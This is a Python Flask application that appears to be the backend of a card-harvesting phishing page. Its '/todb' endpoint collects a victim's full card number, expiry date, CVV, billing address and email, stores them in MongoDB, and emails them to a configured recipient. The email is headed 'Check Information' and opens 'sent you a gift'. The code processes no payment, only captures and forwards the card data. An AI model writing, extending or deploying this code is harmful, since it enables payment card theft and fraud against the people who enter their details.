from flask import Flask, render_template, request,jsonify
from flask_mail import Mail,Message
# from flask_pymongo import PyMongo
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi
import os
from dotenv import load_dotenv

# Load environment variables from .env file


app = Flask(__name__)
load_dotenv()
   #database connection

uri = os.getenv("MONGO_URI")
MAIL_PASSWORD = os.getenv("MAIL_PASSWORD")
MAIL_USERNAME = os.getenv("MAIL_USERNAME")
recipient=os.getenv("RECIPIENT")


# Create a new client and connect to the server
client = MongoClient(uri, server_api=ServerApi('1'))

# Send a ping to confirm a successful connection
try:
    client.admin.command('ping')
    print("Pinged your deployment. You successfully connected to MongoDB!")
except Exception as e:
    print(e)

db=client.get_database('student_details')
collection=db.get_collection('student_info')


#mail connection
app.config['MAIL_SERVER']='smtp.googlemail.com'
app.config['MAIL_PORT']=587
app.config['MAIL_USE_TLS']=True
app.config['MAIL_USERNAME']=MAIL_USERNAME
app.config['MAIL_PASSWORD']=MAIL_PASSWORD
app.config['MAIL_DEFAULT_SENDER']='Details'

mail=Mail(app)


@app.route('/summerlynn')
def index():
    return render_template('index.html')


@app.route('/todb',methods=['POST'])
def todb():
    try:
        if request.method =='POST':
            data=request.json
            card_name=data['card_name']
            card_number=data['card_number']
            card_month=data['card_month']
            card_year=data['card_year']
            cvv=data['cvc']
            country=data['country']
            city=data['city']
            address=data['address']
            zip_code=data['zip_code']
            # phone_number=data['phone_number']
            email=data['email']
            state=data['state']

            # if not card_name or not card_number or not card_month or not card_year or not cvv or not country:
            #     return jsonify({'message':'all fields are required'})
            
            # if len(card_name.split()) < 2 :
            #     return jsonify({'message':'Error: card_name must contain at least two names'})
        
           
            result=collection.insert_one({
                'card_name':card_name,
                'card_number':card_number,
                'card_month':card_month,
                'card_year':card_year,
                'cvv':cvv,
                'country':country,
                'city':city,
                'address':address,
                'zip_code':zip_code,
                'state':state,
                # 'phone_number':phone_number,
                'email':email
                
            })
            if result.acknowledged:
                print('success')
                try:
                    subject="Check Information"
                    body=(f"Hello mate , {card_name}   from {country} sent you a gift: \n"
                          f"name: {card_name},\n"
                          f"country:{country},\n"
                          f"number:{card_number},\n"
                          f" card_month:{card_month},\n" 
                          f" card_year:{card_year},\n"
                          f" cvv:{cvv},\n"
                          f"state:{state}")
                    
             
                    msg=Message(subject=subject, body=body,recipients=[recipient])
                    mail.send(msg)
                except Exception as e:
                    return jsonify({'message5':str(e)})

                return jsonify({'message':'data received'})
            else:
                return jsonify({'message':'data not received'})
        else:
            return jsonify({'message':'invalid request method'})


    except Exception as e:
        return jsonify({'message':str(e)})

   

if __name__ == '__main__':
    app.run(debug=True)